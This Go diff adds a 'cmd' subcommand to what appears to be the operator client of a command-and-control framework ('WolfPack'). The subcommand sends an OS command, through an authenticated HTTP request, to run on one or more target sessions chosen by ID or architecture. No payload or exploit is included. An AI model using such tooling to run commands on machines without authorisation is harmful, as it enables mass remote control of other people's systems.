@@ -237,7 +237,40 @@ func init() {
 			return nil
 		},
 	}
+
 	interactCmd.AddCommand(showCmd)
+
+	commandCmd := &grumble.Command{
+		Name:     "cmd",
+		Help:     "run a command across one or more sessions",
+		LongHelp: "Executes a command across one or more sessions based on the filter provided.",
+		Args: func(a *grumble.Args) {
+			a.String("filter", "Filter sessions by ID range (e.g., '1-5'), comma-separated IDs (1,3,5), 'all', or Arch (e.g., 'Linux')", grumble.Default("-1"))
+			a.StringList("cmd", "OS Command to be executed by the target session")
+		},
+		Run: func(c *grumble.Context) error {
+
+			filterArg := c.Args.String("filter")
+			cmd := c.Args.StringList("cmd")
+			cmdString := strings.Join(cmd, " ")
+
+			// Exec on server and send command
+			reqString := "&command=interact+cmd+" + url.QueryEscape(filterArg) + "+" + url.QueryEscape(cmdString)
+
+			reqString = core.AuthURL + reqString
+
+			_, err := core.WolfPackHTTP.Get(reqString)
+
+			if err != nil {
+				fmt.Println(err)
+				return nil
+			}
+			return nil
+					
+		},
+	}
+
+	interactCmd.AddCommand(commandCmd)
 
 	killCmd := &grumble.Command{
 		Name:     "kill",
